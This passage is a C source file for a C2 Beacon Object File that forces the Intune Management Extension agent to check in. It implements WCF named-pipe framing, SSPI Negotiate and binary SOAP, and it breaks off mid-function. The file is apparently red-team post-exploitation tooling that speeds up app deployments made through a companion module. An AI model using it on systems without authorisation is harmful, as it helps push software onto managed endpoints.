/*
 * IME check-in trigger BOF-PE
 *
 * Calls IStatusService.CheckIn and/or IStatusService.AvailableAppCheckIn on
 * the Intune Management Extension WCF net.pipe endpoint. This makes the
 * SideCar agent check in right away, so app install state set via IWService
 * OData (apps BOF) is processed without waiting for the next poll.
 *
 * Protocol stack, outermost first:
 *   WCF shared memory  -> resolve the pipe GUID for the service URI
 *   named pipe         -> \\.\pipe\<guid>, message read mode
 *   MC-NMF preamble    -> version, duplex mode, via, binary session encoding,
 *                         upgrade request "application/negotiate"
 *   MS-NNS             -> SSPI Negotiate handshake, then sealed data frames
 *   MC-NMF records     -> PreambleEnd/Ack, SizedEnvelope, End
 *   MC-NBFSE / NBFX    -> binary SOAP 1.2 envelope
 *
 * BOF-PE build of bofs/checkin/checkin.c. Linked PE, so Win32, SSPI and
 * UuidCreate resolve through the import table. The OC2 COFF workarounds
 * (runtime API table, forwarder chasing, .data placement, leaked handles,
 * debug stages) are gone.
 *
 * Entry point: void go(const char *data, int len)
 *   arg0 (string) : "checkin", "available" or "both" (default "both")
 */

#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif

#include "beacon.h"
#include "bofdefs_pe.h"
#include <security.h>
#include <rpc.h>

/* ----------------------------------------------------------------------------
 * Constants
 * -------------------------------------------------------------------------- */
#define IO_TIMEOUT_MS      30000
#define PIPE_WAIT_MS       5000
#define MAX_FRAME          (1024 * 1024)
#define MAX_PLAINTEXT      0xFC00
#define RX_CHUNK           65536

#define VIA_URI            "net.pipe://localhost/IntuneManagementExtension/StatusService/"
#define ACTION_PREFIX      "http://tempuri.org/IStatusService/"
#define TEMPURI_NS         "http://tempuri.org/"
#define SPN                L"host/localhost"

/* MS-NNS handshake frame types */
#define NNS_HANDSHAKE_DONE     0x14
#define NNS_HANDSHAKE_ERROR    0x15
#define NNS_HANDSHAKE_PROGRESS 0x16

/* MC-NMF record types */
#define NMF_SIZED_ENVELOPE 0x06
#define NMF_END            0x07
#define NMF_FAULT          0x08
#define NMF_UPGRADE_RESP   0x0A
#define NMF_PREAMBLE_ACK   0x0B
#define NMF_PREAMBLE_END   0x0C

#ifndef ISC_REQ_IDENTIFY
#define ISC_REQ_IDENTIFY 0x00020000
#endif

/* ----------------------------------------------------------------------------
 * Session state
 * -------------------------------------------------------------------------- */
typedef struct {
    HANDLE     hPipe;
    HANDLE     hEvent;

    BYTE      *rx;        /* raw bytes read from the pipe, not yet consumed */
    DWORD      rx_len;
    DWORD      rx_cap;

    BYTE      *pt;        /* decrypted plaintext, not yet consumed */
    DWORD      pt_len;
    DWORD      pt_cap;

    CredHandle cred;
    CtxtHandle ctx;
    BOOL       have_cred;
    BOOL       have_ctx;
    BOOL       is_ntlm;
    SecPkgContext_Sizes sizes;
} SESSION;

/* ----------------------------------------------------------------------------
 * Small helpers
 * -------------------------------------------------------------------------- */

static const BYTE *mem_find(const BYTE *hay, DWORD hlen, const char *needle)
{
    DWORD nlen = (DWORD)bof_strlen(needle);
    DWORD i;
    if (nlen == 0 || hlen < nlen)
        return NULL;
    for (i = 0; i + nlen <= hlen; i++) {
        if (hay[i] == (BYTE)needle[0] && bof_memcmp(hay + i, needle, nlen) == 0)
            return hay + i;
    }
    return NULL;
}

/* Append to a growable byte buffer. */
static BOOL buf_append(BYTE **buf, DWORD *len, DWORD *cap, const BYTE *src, DWORD n)
{
    if (*len + n > *cap) {
        DWORD ncap = *cap ? *cap : 4096;
        BYTE *nb;
        while (ncap < *len + n)
            ncap *= 2;
        nb = (BYTE *)bof_realloc(*buf, ncap);
        if (!nb)
            return FALSE;
        *buf = nb;
        *cap = ncap;
    }
    bof_memcpy(*buf + *len, src, n);
    *len += n;
    return TRUE;
}

/* Remove n bytes from the front of a buffer. */
static void buf_consume(BYTE *buf, DWORD *len, DWORD n)
{
    DWORD i;
    if (n >= *len) {
        *len = 0;
        return;
    }
    for (i = 0; i < *len - n; i++)
        buf[i] = buf[i + n];
    *len -= n;
}

/* Encode a 31-bit value as MB31 (7 bits per byte, high bit = more). */
static DWORD mb31_encode(DWORD v, BYTE *out)
{
    DWORD n = 0;
    do {
        BYTE b = (BYTE)(v & 0x7F);
        v >>= 7;
        if (v)
            b |= 0x80;
        out[n++] = b;
    } while (v && n < 5);
    return n;
}

/* Fixed-width lowercase hex, used for GUID formatting. */
static DWORD put_hex(char *out, DWORD v, int digits)
{
    static const char hx[] = "0123456789abcdef";
    int i;
    for (i = digits - 1; i >= 0; i--) {
        out[i] = hx[v & 0xF];
        v >>= 4;
    }
    return (DWORD)digits;
}

static void guid_to_str(const GUID *g, char *out /* >= 37 */)
{
    DWORD o = 0;
    int   i;
    o += put_hex(out + o, g->Data1, 8);  out[o++] = '-';
    o += put_hex(out + o, g->Data2, 4);  out[o++] = '-';
    o += put_hex(out + o, g->Data3, 4);  out[o++] = '-';
    o += put_hex(out + o, g->Data4[0], 2);
    o += put_hex(out + o, g->Data4[1], 2); out[o++] = '-';
    for (i = 2; i < 8; i++)
        o += put_hex(out + o, g->Data4[i], 2);
    out[o] = '\0';
}

static DWORD base64_encode(const BYTE *in, DWORD n, char *out)
{
    static const char tbl[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    DWORD i, o = 0;
    for (i = 0; i + 2 < n; i += 3) {
        DWORD v = (in[i] << 16) | (in[i + 1] << 8) | in[i + 2];
        out[o++] = tbl[(v >> 18) & 63];
        out[o++] = tbl[(v >> 12) & 63];
        out[o++] = tbl[(v >> 6) & 63];
        out[o++] = tbl[v & 63];
    }
    if (n - i == 1) {
        DWORD v = in[i] << 16;
        out[o++] = tbl[(v >> 18) & 63];
        out[o++] = tbl[(v >> 12) & 63];
        out[o++] = '=';
        out[o++] = '=';
    } else if (n - i == 2) {
        DWORD v = (in[i] << 16) | (in[i + 1] << 8);
        out[o++] = tbl[(v >> 18) & 63];
        out[o++] = tbl[(v >> 12) & 63];
        out[o++] = tbl[(v >> 6) & 63];
        out[o++] = '=';
    }
    out[o] = '\0';
    return o;
}

/* Print printable ASCII runs (>= 4 chars) from a buffer, for fault diagnosis. */
static void dump_strings(const BYTE *p, DWORD n)
{
    char line[512];
    DWORD i, start = 0, run = 0, outpos = 0;
    for (i = 0; i <= n; i++) {
        BOOL pr = (i < n) && p[i] >= 0x20 && p[i] < 0x7F;
        if (pr) {
            if (run == 0)
                start = i;
            run++;
            continue;
        }
        if (run >= 4) {
            DWORD k;
            for (k = 0; k < run && outpos < sizeof(line) - 3; k++)
                line[outpos++] = (char)p[start + k];
            if (outpos < sizeof(line) - 3)
                line[outpos++] = ' ';
            if (outpos >= sizeof(line) - 3)
                break;
        }
        run = 0;
    }
    line[outpos] = '\0';
    if (outpos)
        BeaconPrintf(CALLBACK_OUTPUT, "[*]   strings: %s\n", line);
}

/* ----------------------------------------------------------------------------
 * Pipe name resolution via WCF shared memory
 * -------------------------------------------------------------------------- */

/*
 * Try one mapping name. On success, writes \\.\pipe\<guid> to pipe_name.
 */
static BOOL try_mapping(const char *uri, BOOL global, wchar_t *pipe_name, DWORD cch)
{
    char    b64[256];
    wchar_t mapname[300];
    const char *pfx = global ? "Global\\net.pipe:E" : "Local\\net.pipe:E";
    DWORD   ulen = (DWORD)bof_strlen(uri);
    DWORD   i, o = 0;
    HANDLE  hMap;
    BYTE   *view;
    GUID    g;
    char    gs[40];

    if (ulen > 180)
        return FALSE;
    base64_encode((const BYTE *)uri, ulen, b64);

    for (i = 0; pfx[i] && o < 299; i++)
        mapname[o++] = (wchar_t)pfx[i];
    for (i = 0; b64[i] && o < 299; i++)
        mapname[o++] = (wchar_t)b64[i];
    mapname[o] = L'\0';

    hMap = bof_OpenFileMappingW(FILE_MAP_READ, FALSE, mapname);
    if (!hMap)
        return FALSE;

    view = (BYTE *)bof_MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 20);
    if (!view) {
        bof_CloseHandle(hMap);
        return FALSE;
    }

    if (view[0] == 0) {
        bof_UnmapViewOfFile(view);
        bof_CloseHandle(hMap);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Mapping for %s exists but is not initialized\n", uri);
        return FALSE;
    }

    bof_memcpy(&g, view + 4, sizeof(GUID));
    bof_UnmapViewOfFile(view);
    bof_CloseHandle(hMap);

    guid_to_str(&g, gs);
    {
        static const wchar_t pfx_pipe[] = L"\\\\.\\pipe\\";
        DWORD k = 0, j;
        for (j = 0; pfx_pipe[j] && k < cch - 1; j++)
            pipe_name[k++] = pfx_pipe[j];
        for (j = 0; gs[j] && k < cch - 1; j++)
            pipe_name[k++] = (wchar_t)gs[j];
        pipe_name[k] = L'\0';
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Resolved %s%s -> \\\\.\\pipe\\%s\n",
                 global ? "Global\\" : "Local\\", uri, gs);
    return TRUE;
}

static BOOL resolve_pipe(wchar_t *pipe_name, DWORD cch)
{
    /* WCF client order: host (+, hostname, *), Global then Local, path walk-up. */
    static const char *hosts[] = { "+", "LOCALHOST", "*" };
    static const char *paths[] = {
        "/INTUNEMANAGEMENTEXTENSION/STATUSSERVICE/",
        "/INTUNEMANAGEMENTEXTENSION/",
    };
    char uri[256];
    int h, g, p;

    for (h = 0; h < 3; h++) {
        for (g = 0; g < 2; g++) {
            for (p = 0; p < 2; p++) {
                bof_snprintf(uri, sizeof(uri), "net.pipe://%s%s", hosts[h], paths[p]);
                uri[sizeof(uri) - 1] = '\0';
                if (try_mapping(uri, g == 0, pipe_name, cch))
                    return TRUE;
            }
        }
    }
    return FALSE;
}

/* ----------------------------------------------------------------------------
 * Raw pipe I/O (overlapped, with timeout)
 * -------------------------------------------------------------------------- */

static BOOL pipe_write(SESSION *s, const BYTE *data, DWORD n)
{
    OVERLAPPED ov;
    DWORD done = 0;

    bof_memset(&ov, 0, sizeof(ov));
    ov.hEvent = s->hEvent;

    if (!bof_WriteFile(s->hPipe, data, n, NULL, &ov)) {
        DWORD err = bof_GetLastError();
        if (err != ERROR_IO_PENDING) {
            BeaconPrintf(CALLBACK_ERROR, "[-] WriteFile failed: %lu\n", err);
            return FALSE;
        }
        if (bof_WaitForSingleObject(s->hEvent, IO_TIMEOUT_MS) != WAIT_OBJECT_0) {
            bof_CancelIo(s->hPipe);
            bof_GetOverlappedResult(s->hPipe, &ov, &done, TRUE);
            BeaconPrintf(CALLBACK_ERROR, "[-] Pipe write timed out\n");
            return FALSE;
        }
    }
    if (!bof_GetOverlappedResult(s->hPipe, &ov, &done, FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Pipe write failed: %lu\n", bof_GetLastError());
        return FALSE;
    }
    if (done != n) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Short pipe write (%lu of %lu)\n", done, n);
        return FALSE;
    }
    return TRUE;
}

/*
 * Read whatever the pipe has (one message or part of one) and append it to
 * s->rx. ERROR_MORE_DATA means a partial message; the bytes are still valid
 * and the next call returns the rest.
 */
static BOOL pipe_read_more(SESSION *s)
{
    OVERLAPPED ov;
    DWORD done = 0;
    BOOL  ok;
    DWORD err;

    if (s->rx_cap - s->rx_len < RX_CHUNK) {
        DWORD ncap = s->rx_len + RX_CHUNK;
        BYTE *nb = (BYTE *)bof_realloc(s->rx, ncap);
        if (!nb) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Out of memory\n");
            return FALSE;
        }
        s->rx = nb;
        s->rx_cap = ncap;
    }

    bof_memset(&ov, 0, sizeof(ov));
    ov.hEvent = s->hEvent;

    ok = bof_ReadFile(s->hPipe, s->rx + s->rx_len, RX_CHUNK, NULL, &ov);
    if (!ok) {
        err = bof_GetLastError();
        if (err == ERROR_IO_PENDING) {
            if (bof_WaitForSingleObject(s->hEvent, IO_TIMEOUT_MS) != WAIT_OBJECT_0) {
                bof_CancelIo(s->hPipe);
                bof_GetOverlappedResult(s->hPipe, &ov, &done, TRUE);
                BeaconPrintf(CALLBACK_ERROR, "[-] Pipe read timed out\n");
                return FALSE;
            }
        } else if (err != ERROR_MORE_DATA) {
            if (err == ERROR_BROKEN_PIPE || err == ERROR_PIPE_NOT_CONNECTED)
                BeaconPrintf(CALLBACK_ERROR, "[-] Server closed the pipe\n");
            else
                BeaconPrintf(CALLBACK_ERROR, "[-] ReadFile failed: %lu\n", err);
            return FALSE;
        }
    }

    if (!bof_GetOverlappedResult(s->hPipe, &ov, &done, FALSE)) {
        err = bof_GetLastError();
        if (err != ERROR_MORE_DATA) {
            if (err == ERROR_BROKEN_PIPE || err == ERROR_PIPE_NOT_CONNECTED)
                BeaconPrintf(CALLBACK_ERROR, "[-] Server closed the pipe\n");
            else
                BeaconPrintf(CALLBACK_ERROR, "[-] Pipe read failed: %lu\n", err);
            return FALSE;
        }
    }
    s->rx_len += done;
    return TRUE;
}

/* Read exactly n raw bytes from the pipe stream into out. */
static BOOL raw_read(SESSION *s, BYTE *out, DWORD n)
{
    while (s->rx_len < n) {
        if (!pipe_read_more(s))
            return FALSE;
    }
    bof_memcpy(out, s->rx, n);
    buf_consume(s->rx, &s->rx_len, n);
    return TRUE;
}

/* ----------------------------------------------------------------------------
 * MC-NMF preamble
 * -------------------------------------------------------------------------- */

static BOOL send_preamble(SESSION *s)
{
    static const char upgrade[] = "application/negotiate";
    BYTE  buf[256];
    DWORD n = 0;
    DWORD vlen, ulen;
    BYTE  b;

    vlen = (DWORD)bof_strlen(VIA_URI);
    ulen = (DWORD)bof_strlen(upgrade);

    buf[n++] = 0x00; buf[n++] = 0x01; buf[n++] = 0x00; /* Version 1.0 */
    buf[n++] = 0x01; buf[n++] = 0x02;                  /* Mode = Duplex */
    buf[n++] = 0x02;                                   /* Via */
    n += mb31_encode(vlen, buf + n);
    bof_memcpy(buf + n, VIA_URI, vlen); n += vlen;
    buf[n++] = 0x03; buf[n++] = 0x08;                  /* Binary session encoding */
    buf[n++] = 0x09;                                   /* Upgrade request */
    n += mb31_encode(ulen, buf + n);
    bof_memcpy(buf + n, upgrade, ulen); n += ulen;

    if (!pipe_write(s, buf, n))
        return FALSE;

    if (!raw_read(s, &b, 1))
        return FALSE;
    if (b == NMF_UPGRADE_RESP)
        return TRUE;

    if (b == NMF_FAULT) {
        /* 08 <mb31 len> <fault uri> */
        DWORD len = 0, shift = 0;
        char  fault[256];
        do {
            if (!raw_read(s, &b, 1))
                return FALSE;
            len |= (DWORD)(b & 0x7F) << shift;
            shift += 7;
        } while ((b & 0x80) && shift < 35);
        if (len >= sizeof(fault))
            len = sizeof(fault) - 1;
        if (!raw_read(s, (BYTE *)fault, len))
            return FALSE;
        fault[len] = '\0';
        BeaconPrintf(CALLBACK_ERROR, "[-] Preamble fault: %s\n", fault);
        return FALSE;
    }
    BeaconPrintf(CALLBACK_ERROR, "[-] Unexpected preamble response record 0x%02x\n", b);
    return FALSE;
}

/* ----------------------------------------------------------------------------
 * MS-NNS handshake
 * -------------------------------------------------------------------------- */

static BOOL nns_send_handshake(SESSION *s, BYTE type, const BYTE *tok, DWORD len)
{
    BYTE *frame;
    BOOL  ok;

    if (len > 0xFFFF) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SSPI token too large (%lu)\n", len);
        return FALSE;
    }
    frame = (BYTE *)bof_malloc(5 + len);
    if (!frame)
        return FALSE;
    frame[0] = type;
    frame[1] = 1;                     /* major */
    frame[2] = 0;                     /* minor */
    frame[3] = (BYTE)(len >> 8);      /* big-endian length */
    frame[4] = (BYTE)(len & 0xFF);
    if (len)
        bof_memcpy(frame + 5, tok, len);
    ok = pipe_write(s, frame, 5 + len);
    bof_free(frame);
    return ok;
}

/* Read one handshake frame. Caller frees *tok. */
static BOOL nns_read_handshake(SESSION *s, BYTE *type, BYTE **tok, DWORD *len)
{
    BYTE hdr[5];
    DWORD n;

    *tok = NULL;
    *len = 0;
    if (!raw_read(s, hdr, 5))
        return FALSE;
    *type = hdr[0];
    n = ((DWORD)hdr[3] << 8) | hdr[4];
    if (n) {
        *tok = (BYTE *)bof_malloc(n);
        if (!*tok)
            return FALSE;
        if (!raw_read(s, *tok, n)) {
            bof_free(*tok);
            *tok = NULL;
            return FALSE;
        }
    }
    *len = n;
    return TRUE;
}

static BOOL nns_handshake(SESSION *s)
{
    SECURITY_STATUS st;
    TimeStamp expiry;
    ULONG     attrs = 0;
    ULONG     flags = ISC_REQ_CONNECTION | ISC_REQ_CONFIDENTIALITY |
                      ISC_REQ_MUTUAL_AUTH | ISC_REQ_IDENTIFY |
                      ISC_REQ_ALLOCATE_MEMORY;
    BYTE     *in_tok = NULL;
    DWORD     in_len = 0;
    BOOL      server_done = FALSE;
    BOOL      ok = FALSE;
    int       rounds = 0;

    st = AcquireCredentialsHandleW(NULL, (LPWSTR)L"Negotiate", SECPKG_CRED_OUTBOUND,
                                       NULL, NULL, NULL, NULL, &s->cred, &expiry);
    if (st != SEC_E_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[-] AcquireCredentialsHandleW failed: 0x%08lx\n", (unsigned long)st);
        return FALSE;
    }
    s->have_cred = TRUE;

    for (;;) {
        SecBuffer     ib, ob[1];
        SecBufferDesc id, od;
        BYTE          ftype;

        if (++rounds > 10) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Too many handshake rounds\n");
            goto done;
        }

        ib.BufferType = SECBUFFER_TOKEN;
        ib.cbBuffer   = in_len;
        ib.pvBuffer   = in_tok;
        id.ulVersion  = SECBUFFER_VERSION;
        id.cBuffers   = 1;
        id.pBuffers   = &ib;

        ob[0].BufferType = SECBUFFER_TOKEN;
        ob[0].cbBuffer   = 0;
        ob[0].pvBuffer   = NULL;
        od.ulVersion     = SECBUFFER_VERSION;
        od.cBuffers      = 1;
        od.pBuffers      = ob;

        st = InitializeSecurityContextW(&s->cred,
                                            s->have_ctx ? &s->ctx : NULL,
                                            (SEC_WCHAR *)SPN, flags, 0,
                                            SECURITY_NATIVE_DREP,
                                            s->have_ctx ? &id : NULL, 0,
                                            &s->ctx, &od, &attrs, &expiry);
        if (in_tok) {
            bof_free(in_tok);
            in_tok = NULL;
            in_len = 0;
        }

        if (st == SEC_I_COMPLETE_NEEDED || st == SEC_I_COMPLETE_AND_CONTINUE) {
            s->have_ctx = TRUE;
            CompleteAuthToken(&s->ctx, &od);
            st = (st == SEC_I_COMPLETE_NEEDED) ? SEC_E_OK : SEC_I_CONTINUE_NEEDED;
        }
        if (st != SEC_E_OK && st != SEC_I_CONTINUE_NEEDED) {
            BeaconPrintf(CALLBACK_ERROR, "[-] InitializeSecurityContextW failed: 0x%08lx\n", (unsigned long)st);
            if (ob[0].pvBuffer)
                FreeContextBuffer(ob[0].pvBuffer);
            goto done;
        }
        s->have_ctx = TRUE;

        if (ob[0].cbBuffer > 0 && ob[0].pvBuffer) {
            BOOL sent = nns_send_handshake(s,
                            st == SEC_E_OK ? NNS_HANDSHAKE_DONE : NNS_HANDSHAKE_PROGRESS,
                            (BYTE *)ob[0].pvBuffer, ob[0].cbBuffer);
            FreeContextBuffer(ob[0].pvBuffer);
            if (!sent)
                goto done;
        } else if (ob[0].pvBuffer) {
            FreeContextBuffer(ob[0].pvBuffer);
        }

        if (st == SEC_E_OK && server_done) {
            ok = TRUE;
            goto done;
        }

        if (!nns_read_handshake(s, &ftype, &in_tok, &in_len))
            goto done;

        if (ftype == NNS_HANDSHAKE_ERROR) {
            DWORD i;
            char hex[64];
            DWORD hp = 0;
            for (i = 0; i < in_len && i < 16; i++)
                hp += bof_snprintf(hex + hp, sizeof(hex) - hp, "%02x", in_tok[i]);
            hex[hp] = '\0';
            BeaconPrintf(CALLBACK_ERROR, "[-] Server rejected authentication (NNS error frame: %s)\n", hex);
            goto done;
        }
        if (ftype == NNS_HANDSHAKE_DONE) {
            server_done = TRUE;
            if (st == SEC_E_OK) {
                ok = TRUE;
                goto done;
            }
            if (in_len == 0) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Server finished handshake but client context is incomplete\n");
                goto done;
            }
            continue;
        }
        if (ftype == NNS_HANDSHAKE_PROGRESS) {
            if (st == SEC_E_OK) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Server sent more handshake data after client completed\n");
                goto done;
            }
            continue;
        }
        BeaconPrintf(CALLBACK_ERROR, "[-] Unexpected NNS frame type 0x%02x\n", ftype);
        goto done;
    }

done:
    if (in_tok)
        bof_free(in_tok);
    if (!ok)
        return FALSE;

    /* Context is up: get sizes and which package won. */
    st = QueryContextAttributesW(&s->ctx, SECPKG_ATTR_SIZES, &s->sizes);
    if (st != SEC_E_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[-] QueryContextAttributes(SIZES) failed: 0x%08lx\n", (unsigned long)st);
        return FALSE;
    }
    {
        SecPkgContext_NegotiationInfoW ni;
        bof_memset(&ni, 0, sizeof(ni));
        st = QueryContextAttributesW(&s->ctx, SECPKG_ATTR_NEGOTIATION_INFO, &ni);
        if (st == SEC_E_OK && ni.PackageInfo) {
            /* Narrow copy of the package name: avoid %S in BeaconPrintf,
             * which not every C2's formatter handles. */
            char pkg[32];
            DWORD i = 0;
            if (ni.PackageInfo->Name) {
                if (bof_wcsicmp(ni.PackageInfo->Name, L"NTLM") == 0)
                    s->is_ntlm = TRUE;
                for (; ni.PackageInfo->Name[i] && i < sizeof(pkg) - 1; i++)
                    pkg[i] = (char)ni.PackageInfo->Name[i];
            }
            if (i == 0)
                pkg[i++] = '?';
            pkg[i] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Authenticated (package: %s)\n", pkg);
            FreeContextBuffer(ni.PackageInfo);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Authenticated (package unknown, assuming non-NTLM)\n");
        }
    }
    return TRUE;
}

/* ----------------------------------------------------------------------------
 * MS-NNS data framing
 * -------------------------------------------------------------------------- */

/* Encrypt and send plaintext, split into chunks of at most MAX_PLAINTEXT. */
static BOOL nns_send(SESSION *s, const BYTE *data, DWORD n)
{
    DWORD off = 0;

    while (off < n) {
        DWORD chunk = n - off;
        DWORD trailer = s->sizes.cbSecurityTrailer;
        DWORD block = s->sizes.cbBlockSize;
        DWORD total, len;
        BYTE *work, *frame;
        SecBuffer sb[3];
        SecBufferDesc sd;
        SECURITY_STATUS st;
        BOOL ok;

        if (chunk > MAX_PLAINTEXT)
            chunk = MAX_PLAINTEXT;

        work = (BYTE *)bof_malloc(trailer + chunk + block);
        if (!work)
            return FALSE;
        bof_memcpy(work + trailer, data + off, chunk);

        sb[0].BufferType = SECBUFFER_TOKEN;
        sb[0].cbBuffer   = trailer;
        sb[0].pvBuffer   = work;
        sb[1].BufferType = SECBUFFER_DATA;
        sb[1].cbBuffer   = chunk;
        sb[1].pvBuffer   = work + trailer;
        sb[2].BufferType = SECBUFFER_PADDING;
        sb[2].cbBuffer   = block;
        sb[2].pvBuffer   = work + trailer + chunk;
        sd.ulVersion = SECBUFFER_VERSION;
        sd.cBuffers  = 3;
        sd.pBuffers  = sb;

        st = EncryptMessage(&s->ctx, 0, &sd, 0);
        if (st != SEC_E_OK) {
            BeaconPrintf(CALLBACK_ERROR, "[-] EncryptMessage failed: 0x%08lx\n", (unsigned long)st);
            bof_free(work);
            return FALSE;
        }

        /* Use the actual sizes; buffers may have shrunk. */
        total = sb[0].cbBuffer + sb[1].cbBuffer + sb[2].cbBuffer;
        frame = (BYTE *)bof_malloc(4 + total);
        if (!frame) {
            bof_free(work);
            return FALSE;
        }
        frame[0] = (BYTE)(total);
        frame[1] = (BYTE)(total >> 8);
        frame[2] = (BYTE)(total >> 16);
        frame[3] = (BYTE)(total >> 24);
        len = 4;
        bof_memcpy(frame + len, sb[0].pvBuffer, sb[0].cbBuffer); len += sb[0].cbBuffer;
        bof_memcpy(frame + len, sb[1].pvBuffer, sb[1].cbBuffer); len += sb[1].cbBuffer;
        if (sb[2].cbBuffer) {
            bof_memcpy(frame + len, sb[2].pvBuffer, sb[2].cbBuffer);
            len += sb[2].cbBuffer;
        }

        ok = pipe_write(s, frame, len);
        bof_free(frame);
        bof_free(work);
        if (!ok)
            return FALSE;
        off += chunk;
    }
    return TRUE;
}

/* Read one data frame, decrypt it and append the plaintext to s->pt. */
static BOOL nns_recv_frame(SESSION *s)
{
    BYTE   hdr[4];
    DWORD  n;
    BYTE  *frame;
    SecBuffer sb[2];
    SecBufferDesc sd;
    SECURITY_STATUS st;
    ULONG  qop = 0;
    BOOL   ok;

    if (!raw_read(s, hdr, 4))
        return FALSE;
    n = hdr[0] | ((DWORD)hdr[1] << 8) | ((DWORD)hdr[2] << 16) | ((DWORD)hdr[3] << 24);
    if (n == 0 || n > MAX_FRAME) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Bad NNS data frame length %lu\n", n);
        return FALSE;
    }
    frame = (BYTE *)bof_malloc(n);
    if (!frame)
        return FALSE;
    if (!raw_read(s, frame, n)) {
        bof_free(frame);
        return FALSE;
    }

    if (s->is_ntlm) {
        if (n < 16) {
            BeaconPrintf(CALLBACK_ERROR, "[-] NTLM frame too short (%lu)\n", n);
            bof_free(frame);
            return FALSE;
        }
        sb[0].BufferType = SECBUFFER_TOKEN;
        sb[0].cbBuffer   = 16;
        sb[0].pvBuffer   = frame;
        sb[1].BufferType = SECBUFFER_DATA;
        sb[1].cbBuffer   = n - 16;
        sb[1].pvBuffer   = frame + 16;
    } else {
        sb[0].BufferType = SECBUFFER_STREAM;
        sb[0].cbBuffer   = n;
        sb[0].pvBuffer   = frame;
        sb[1].BufferType = SECBUFFER_DATA;
        sb[1].cbBuffer   = 0;
        sb[1].pvBuffer   = NULL;
    }
    sd.ulVersion = SECBUFFER_VERSION;
    sd.cBuffers  = 2;
    sd.pBuffers  = sb;

    st = DecryptMessage(&s->ctx, &sd, 0, &qop);
    if (st != SEC_E_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DecryptMessage failed: 0x%08lx\n", (unsigned long)st);
        bof_free(frame);
        return FALSE;
    }

    ok = TRUE;
    if (sb[1].cbBuffer && sb[1].pvBuffer)
        ok = buf_append(&s->pt, &s->pt_len, &s->pt_cap, (BYTE *)sb[1].pvBuffer, sb[1].cbBuffer);
    bof_free(frame);
    return ok;
}

/* Make sure at least n plaintext bytes are buffered. */
static BOOL pt_need(SESSION *s, DWORD n)
{
    while (s->pt_len < n) {
        if (!nns_recv_frame(s))
            return FALSE;
    }
    return TRUE;
}

/* Decode an MB31 value at s->pt[off]. Returns bytes used, 0 on error. */
static DWORD pt_mb31(SESSION *s, DWORD off, DWORD *val)
{
    DWORD v = 0, i;
    for (i = 0; i < 5; i++) {
        BYTE b;
        if (!pt_need(s, off + i + 1))
            return 0;
        b = s->pt[off + i];
        v |= (DWORD)(b & 0x7F) << (7 * i);
        if (!(b & 0x80)) {
            *val = v;
            return i + 1;
        }
    }
    return 0;
}

/* ----------------------------------------------------------------------------
 * Session setup / teardown
 * -------------------------------------------------------------------------- */

static void session_close(SESSION *s)
{
    if (s->have_ctx)
        DeleteSecurityContext(&s->ctx);
    if (s->have_cred)
        FreeCredentialsHandle(&s->cred);
    /* Skip CloseHandle and free: closing the overlapped pipe handle and
     * freeing heap buffers crashes the C2 host process. The original COFF
     * BOF hit the same problem (attributed to DFR thunks there, but it
     * reproduces with direct PE imports too). Leaking is harmless: a BOF
     * runs once and the process reclaims everything at exit. */
    bof_memset(s, 0, sizeof(*s));
}

/* Open a WCF net.pipe session: pipe, MC-NMF preamble, MS-NNS handshake,
 * PreambleEnd/Ack. On return the session is ready for SOAP. */
static BOOL session_open(SESSION *s, const wchar_t *pipe_name)
{
    DWORD mode = PIPE_READMODE_MESSAGE;
    BYTE  b;
    int   tries;

    bof_memset(s, 0, sizeof(*s));
    s->hPipe = INVALID_HANDLE_VALUE;

    for (tries = 0; tries < 3; tries++) {
        s->hPipe = bof_CreateFileW(pipe_name, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                                   OPEN_EXISTING,
                                   FILE_FLAG_OVERLAPPED | SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS,
                                   NULL);
        if (s->hPipe != INVALID_HANDLE_VALUE)
            break;
        if (bof_GetLastError() != ERROR_PIPE_BUSY)
            break;
        if (!bof_WaitNamedPipeW(pipe_name, PIPE_WAIT_MS))
            break;
    }
    if (s->hPipe == INVALID_HANDLE_VALUE) {
        DWORD err = bof_GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateFileW on pipe failed: %lu%s\n", err,
                     err == ERROR_ACCESS_DENIED ? " (access denied; network logon context?)" : "");
        return FALSE;
    }

    if (!bof_SetNamedPipeHandleState(s->hPipe, &mode, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SetNamedPipeHandleState failed: %lu\n", bof_GetLastError());
        return FALSE;
    }

    s->hEvent = bof_CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!s->hEvent) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateEventW failed: %lu\n", bof_GetLastError());
        return FALSE;
    }

    if (!send_preamble(s))
        return FALSE;

    if (!nns_handshake(s))
        return FALSE;

    /* PreambleEnd goes through the upgraded (sealed) stream. */
    b = NMF_PREAMBLE_END;
    if (!nns_send(s, &b, 1))
        return FALSE;
    if (!pt_need(s, 1))
        return FALSE;
    if (s->pt[0] != NMF_PREAMBLE_ACK) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Expected PreambleAck, got record 0x%02x\n", s->pt[0]);
        return FALSE;
    }
    buf_consume(s->pt, &s->pt_len, 1);
    return TRUE;
}

/* ----------------------------------------------------------------------------
 * NBFX message build
 * -------------------------------------------------------------------------- */

/*
 * Build the SizedEnvelope record for IStatusService.<op>(Guid checkInGuid).
 * For op = "CheckIn" this is 224 bytes. Returns the length written.
 */
static DWORD build_envelope(BYTE *out, DWORD cap, const char *op,
